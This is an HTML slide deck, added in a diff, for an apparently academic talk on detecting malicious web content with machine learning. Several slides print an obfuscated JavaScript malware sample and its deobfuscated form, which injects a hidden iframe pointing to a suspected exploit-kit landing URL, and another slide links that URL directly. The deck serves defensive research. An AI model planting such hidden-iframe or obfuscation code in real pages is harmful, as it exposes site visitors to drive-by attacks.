@@ -1,0 +1,400 @@
+﻿<!doctype html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <title>DMWCML</title>
+    <meta name="description" content="Detection of Malicious Web Content with Machine Learning">
+    <meta name="author" content="Antoine Vianey-Liaud">
+    <meta name="apple-mobile-web-app-capable" content="yes" />
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <script src="//code.jquery.com/jquery-1.8.0.js"></script>
+    <script src="//code.jquery.com/ui/1.8.23/jquery-ui.js"></script>
+    <script src="//netdna.bootstrapcdn.com/twitter-bootstrap/2.2.1/js/bootstrap.min.js"></script>
+    <script type="text/javascript" src="//cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+    <link href="//netdna.bootstrapcdn.com/twitter-bootstrap/2.2.1/css/bootstrap-combined.min.css" rel="stylesheet">
+    <link rel="stylesheet" href="css/reveal.css">
+    <link rel="stylesheet" href="css/theme/sky.css" id="theme">
+    <link type="text/css" rel="stylesheet" href="fsharp.formatting/styles/style.css" />
+    <link type="text/css" rel="stylesheet" href="fsharp.formatting/styles/deedle.css" />
+    <link type="text/css" rel="stylesheet" href="css/custom.css" />
+    <script src="fsharp.formatting/styles/tips.js" type="text/javascript"></script>
+    <!-- For syntax highlighting -->
+    <link rel="stylesheet" href="lib/css/zenburn.css">
+    <link rel="stylesheet" href="css/fsreveal.css">
+    <!-- If the query includes 'print-pdf', include the PDF print sheet -->
+    <script>
+			if( window.location.search.match( /print-pdf/gi ) ) {
+				var link = document.createElement( 'link' );
+				link.rel = 'stylesheet';
+				link.type = 'text/css';
+				link.href = 'css/print/pdf.css';
+				document.getElementsByTagName( 'head' )[0].appendChild( link );
+			}
+    </script>
+    <!--[if lt IE 9]>
+    <script src="lib/js/html5shiv.js"></script>
+    <![endif]-->
+    <script language="javascript" type="text/javascript">
+        function init()
+        {
+            websocket = new WebSocket("ws://"+window.location.host+"/websocket");
+            websocket.onmessage = function(evt) { location.reload(); };
+        }
+        window.addEventListener("load", init, false);
+    </script>
+</head>
+<body>
+    <div class="reveal">
+        
+        <!-- Any section element inside of this container is displayed as a slide -->
+        <div class="slides">
+            <section >
+<h3>Detection of Malicious Web Content with Machine Learning</h3>
+<p>Antoine Vianey-Liaud</p>
+<p>Supervised by Dr. Sergio Maffeis</p>
+<p>15/09/2016</p>
+<p><img src="images/imperial.png" alt="imperial" /></p>
+</section>
+<section data-background="#5d85d5">
+<h3>Summary</h3>
+<ol>
+<li>Attackers vs Defenders</li>
+<li>Best practices</li>
+<li>Methodology and implementation</li>
+<li>Results</li>
+<li>Conclusion and future work</li>
+</ol>
+</section>
+<section >
+<h3>Attackers vs Defenders</h3>
+<p>An endless armrace</p>
+<p><img src="images/armrace.png" alt="armrace" /></p>
+</section>
+<section >
+<section >
+<h3>Attackers vs Defenders</h3>
+<p>An example of obfuscation and evasion (1/4)</p>
+<p><img src="images/sample1.png" alt="sample1" /></p>
+</section>
+<section >
+<h3>Attackers vs Defenders</h3>
+<p>An example of obfuscation and evasion (2/4)</p>
+<table class="pre"><tr><td class="lines"><pre class="fssnip"><span class="l"> 1: </span>
+<span class="l"> 2: </span>
+<span class="l"> 3: </span>
+<span class="l"> 4: </span>
+<span class="l"> 5: </span>
+<span class="l"> 6: </span>
+<span class="l"> 7: </span>
+<span class="l"> 8: </span>
+<span class="l"> 9: </span>
+<span class="l">10: </span>
+<span class="l">11: </span>
+<span class="l">12: </span>
+<span class="l">13: </span>
+<span class="l">14: </span>
+<span class="l">15: </span>
+<span class="l">16: </span>
+<span class="l">17: </span>
+<span class="l">18: </span>
+</pre></td>
+<td class="snippet"><pre class="fssnip"><code lang="Javascript">b=new function(){return 2;};
+
+if(!+b)
+    String.prototype.vqwfbeweb='h'+'arC';
+
+for(i in $='b4h3tbn34')
+    if(i=='vqwfbeweb')
+        m=$[i];
+
+try{
+    new Object().wehweh();}
+catch(q){
+    ss="";}
+
+try{
+    window['e'+'v'+'al']('asdas')}
+catch(q){
+    s=String["fr"+"omC"+m+"od"+'e'];}
+</code></pre></td></tr></table>
+</section>
+<section >
+<h3>Attackers vs Defenders</h3>
+<p>An example of obfuscation and evasion (3/4)</p>
+<table class="pre"><tr><td class="lines"><pre class="fssnip"><span class="l"> 1: </span>
+<span class="l"> 2: </span>
+<span class="l"> 3: </span>
+<span class="l"> 4: </span>
+<span class="l"> 5: </span>
+<span class="l"> 6: </span>
+<span class="l"> 7: </span>
+<span class="l"> 8: </span>
+<span class="l"> 9: </span>
+<span class="l">10: </span>
+<span class="l">11: </span>
+<span class="l">12: </span>
+<span class="l">13: </span>
+<span class="l">14: </span>
+<span class="l">15: </span>
+<span class="l">16: </span>
+</pre></td>
+<td class="snippet"><pre class="fssnip"><code lang="Javascript">d=new Date();
+d2=new Date(d.valueOf()-2);
+Object.prototype.asd='e';
+
+if({}.asd==='e')
+    a=document["c"+"r"+"e"+"a"+"t"+"e"+"T"+"e"+"x"+"t"+"N"+"o"+"d"+"e"]('321');
+
+if(a.data==321)
+    h=-1*(d-d2);
+
+n=[-h+7,-h+7, ... ,-h+7,-h+7,-h+123];
+
+for(i=0;i&lt;n.length;i++)
+    ss+=s(eval("n"+"[i"+"]"));
+
+if(!+b)eval(ss);
+</code></pre></td></tr></table>
+</section>
+<section >
+<h3>Attackers vs Defenders</h3>
+<p>An example of obfuscation and evasion (4/4)</p>
+<table class="pre"><tr><td class="lines"><pre class="fssnip"><span class="l"> 1: </span>
+<span class="l"> 2: </span>
+<span class="l"> 3: </span>
+<span class="l"> 4: </span>
+<span class="l"> 5: </span>
+<span class="l"> 6: </span>
+<span class="l"> 7: </span>
+<span class="l"> 8: </span>
+<span class="l"> 9: </span>
+<span class="l">10: </span>
+<span class="l">11: </span>
+<span class="l">12: </span>
+<span class="l">13: </span>
+<span class="l">14: </span>
+<span class="l">15: </span>
+<span class="l">16: </span>
+<span class="l">17: </span>
+</pre></td>
+<td class="snippet"><pre class="fssnip"><code lang="Javascript">/* Deobfuscated version */
+if (document.getElementsByTagName('body')[0]){
+ iframer();
+}else{
+ document.write("&lt;iframe src='http://%71%65%72 ... %66%2E%6D%73
+  /main.php?page=b5a87c34230be775' width='10' height='10' 
+  style='visibility:hidden;position:absolute;left:0;top:0;'&gt;&lt;/iframe&gt;");    
+} 
+function iframer(){
+ var f = document.createElement('iframe');
+ f.setAttribute('src','http://%71%65%72...%2E%6D%73
+  /main.php?page=b5a87c34230be775'); 
+ f.style.visibility='hidden';f.style.position='absolute';
+ f.style.left='0';f.style.top='0';f.setAttribute('width','10');
+ f.setAttribute('height','10');
+ document.getElementsByTagName('body')[0].appendChild(f);
+}
+</code></pre></td></tr></table>
+</section>
+<section >
+<p>iframe pointing to <a href="http://qerfhgkadhsfukhertgrpotgjpoidfg.ce.ms/main.php?page=b5a87c34230be775">http://qerfhgkadhsfukhertgrpotgjpoidfg.ce.ms/main.php?page=b5a87c34230be775</a></p>
+<p>Possibly Angler EK landing page</p>
+</section>
+</section>
+<section >
+<h3>Best practices</h3>
+<p><img src="images/best.png" alt="best" /></p>
+</section>
+<section data-background="#5d85d5">
+<h3>Methodology and implementation</h3>
+<ol>
+<li>Training</li>
+<li>Prediction</li>
+</ol>
+</section>
+<section >
+<h3>Training</h3>
+<p><img src="images/main_architecture.png" alt="main_architecture" /></p>
+</section>
+<section >
+<h3>Prediction</h3>
+<table class="pre"><tr><td class="lines"><pre class="fssnip"><span class="l">1: </span>
+<span class="l">2: </span>
+<span class="l">3: </span>
+<span class="l">4: </span>
+<span class="l">5: </span>
+</pre></td>
+<td class="snippet"><pre class="fssnip"><code lang="py">def predict(url_name):
+    clf = joblib.load("Dumps/clf_rforest.pkl")
+    X_to_predict = url_to_X(url_name, "Dumps/feat_names.pkl")
+    prediction =  clf.predict(X_to_predict)[0]
+    return ("Prediction: benign." if prediction == 0 else "Prediction: malicious.")
+</code></pre></td></tr></table>
+</section>
+<section >
+<h3>Prediction</h3>
+<p><img src="images/detector.png" alt="detector" /></p>
+</section>
+<section data-background="#5d85d5">
+<h3>Results</h3>
+<ol>
+<li>Best classifier</li>
+<li>Best features</li>
+<li>Demo</li>
+<li>Click-depth graph</li>
+</ol>
+</section>
+<section >
+<section >
+<h3>Best classifier</h3>
+<p>Random Forest</p>
+<table>
+<thead>
+<tr class="header">
+<th align="center"><p>TP</p></th>
+<th align="center"><p>FP</p></th>
+<th align="center"><p>FN</p></th>
+<th align="center"><p>TN</p></th>
+</tr>
+</thead>
+<tbody>
+<tr class="odd">
+<td align="center"><p>58%</p></td>
+<td align="center"><p>12%</p></td>
+<td align="center"><p>5%</p></td>
+<td align="center"><p>25%</p></td>
+</tr>
+</tbody>
+</table>
+
+<table>
+<thead>
+<tr class="header">
+<th align="center"><p>Precision</p></th>
+<th align="center"><p>Recall</p></th>
+<th align="center"><p>F2</p></th>
+</tr>
+</thead>
+<tbody>
+<tr class="odd">
+<td align="center"><p>83%</p></td>
+<td align="center"><p>92%</p></td>
+<td align="center"><p>90%</p></td>
+</tr>
+</tbody>
+</table>
+
+</section>
+<section data-background="images/randomforest.jpg">
+</section>
+<section >
+<p><img src="images/stats1.png" alt="stats1" />
+<img src="images/stats2.png" alt="stats2" /></p>
+</section>
+<section >
+<ul>
+<li>Accuracy = ( TP + TN ) / ( TP + FP + TN + FN)</li>
+<li>Precision = TP / ( TP + FP )</li>
+<li>Recall = TP / ( TP + FN )</li>
+<li>F2 = 5 Precision*Recall /(4 Precision + Recall)</li>
+<li>NPP = TN / ( TN + FN )</li>
+<li>Specificity = TN / ( TN + FP )</li>
+</ul>
+</section>
+</section>
+<section >
+<h3>Best features</h3>
+<ul>
+<li>
+<strong>HTML + Javascript</strong>
+<ul>
+<li>HTML letters count (43%)</li>
+<li>
+Javascript words per line (8%)
+<br>
+</li>
+</ul>
+</li>
+<li>
+<strong>Only Javascript</strong>
+<ul>
+<li>Keyword 'escape' count (30%)</li>
+<li>Javascript words per line (9%)</li>
+</ul>
+</li>
+</ul>
+</section>
+<section >
+<h3>Demo</h3>
+</section>
+<section >
+<h3>Click-depth graph</h3>
+<p><img src="images/click2.png" alt="click" /></p>
+</section>
+<section >
+<h3>Conclusion</h3>
+<ul>
+<li>Best practices</li>
+<li>
+Prototype of detector
+<ul>
+<li>Static analysis</li>
+<li>Selenium</li>
+<li>Machine Learning</li>
+<li>Evaluation: browser extension, click-depth graph</li>
+</ul>
+</li>
+</ul>
+</section>
+<section >
+<h3>Future work</h3>
+<ul>
+<li>Enlarge datasets</li>
+<li>Improve predicition performance: cache and whitelist</li>
+<li>Comparison of classifiers</li>
+<li>Test the detector with a demo website</li>
+</ul>
+</section>
+<section >
+<h2>Thank you</h2>
+</section>
+
+
+        </div>
+    </div>
+    <script src="lib/js/head.min.js"></script>
+    <script src="js/reveal.js"></script>
+    <script>
+        // Add the nohighlight class and data-noescape attribute to code elements that have already been formatted by FSharp.Formatting
+        $('pre.highlighted code').addClass('nohighlight').attr('data-noescape', '');
+
+        // Full list of configuration options available here:
+        // https://github.com/hakimel/reveal.js#configuration
+        Reveal.initialize({
+            controls: true,
+            progress: true,
+            history: true,
+            center: true,
+
+            transition: 'default', // default/cube/page/concave/zoom/linear/fade/none
+
+            // Parallax scrolling
+            // parallaxBackgroundImage: 'https://s3.amazonaws.com/hakim-static/reveal-js/reveal-parallax-1.jpg',
+            // parallaxBackgroundSize: '2100px 900px',
+
+            // Optional libraries used to extend on reveal.js
+            dependencies: [
+                { src: 'lib/js/classList.js', condition: function () { return !document.body.classList; } },
+                { src: 'plugin/markdown/marked.js', condition: function () { return !!document.querySelector('[data-markdown]'); } },
+                { src: 'plugin/markdown/markdown.js', condition: function () { return !!document.querySelector('[data-markdown]'); } },
+                { src: 'plugin/highlight/highlight.js', async: true, callback: function () { hljs.initHighlightingOnLoad(); } },
+                { src: 'plugin/zoom-js/zoom.js', async: true, condition: function () { return !!document.body.classList; } },
+                { src: 'plugin/notes/notes.js', async: true, condition: function () { return !!document.body.classList; } }
+            ]
+        });
+
+    </script>
+</body>
+</html>
+
